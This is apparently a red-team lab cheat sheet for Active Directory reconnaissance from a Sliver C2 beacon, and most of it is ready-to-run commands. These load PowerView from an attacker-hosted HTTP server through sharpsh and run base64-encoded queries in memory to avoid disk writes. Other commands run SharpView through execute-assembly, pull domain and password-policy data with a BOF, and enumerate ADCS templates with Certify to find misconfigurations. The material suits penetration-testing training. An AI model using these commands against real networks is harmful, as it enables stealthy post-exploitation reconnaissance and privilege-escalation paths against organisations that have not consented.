# 15.07 Domain Reconnaissance via Sliver

> Recon AD from Sliver via `sharpsh` (PowerView loader), `SharpView`, `c2tc-domaininfo` BOF, and `certify` for ADCS.

## Overview

Domain recon from a Sliver session uses sharpsh (RunSpaceFactory PowerView loader), SharpView's alias, c2tc-domaininfo BOF, certify for ADCS, and native execute -o calls. sharpsh fetches PowerView.ps1 over HTTP and executes base64-encoded commands to avoid disk writes.

## Steps

- Base64-encode PowerView queries in UTF-8 for use with sharpsh `-e -c`.
- Host PowerView.ps1 on a Python HTTP server; start `http -L <ip> -l <port>` in Sliver for internal hosts.
- `sharpview <function> [args]` runs SharpView with armory alias.
- `c2tc-domaininfo` BOF retrieves domain info including password policy without PowerShell.
- `certify -- find` enumerates ADCS templates for ESC misconfigurations.
- `ifconfig` lists network adapters and IPs without spawning a shell.
- `execute -o powershell` runs inline PS for .NET namespace queries (spawns brief PS window).

## Commands

### Enumerate users + descriptions via sharpsh

```bash
echo -n "get-netuser | select  samaccountname,description" | base64
```

### Run sharpsh with PowerView

```text
sliver (http-beacon) > sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u'
```

### SharpView enumerate domain

```text
sliver (http-beacon) > execute-assembly /home/htb-ac590/SharpView.exe "get-domain" -t 240 -i -E -M
```

### c2tc-domaininfo BOF

```text
sliver (http-beacon) > c2tc-domaininfo
```

### Certify find templates

```text
sliver (http-beacon) > certify -- find
```

### certutil enumerate CAs

```text
sliver (http-beacon) > execute -o certutil.exe
```

### ifconfig

```text
sliver (http-beacon) > ifconfig
```

### PowerShell forest enumeration (in-process)

```text
sliver (http-beacon) > execute -o powershell $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); $Forest.Domains
```
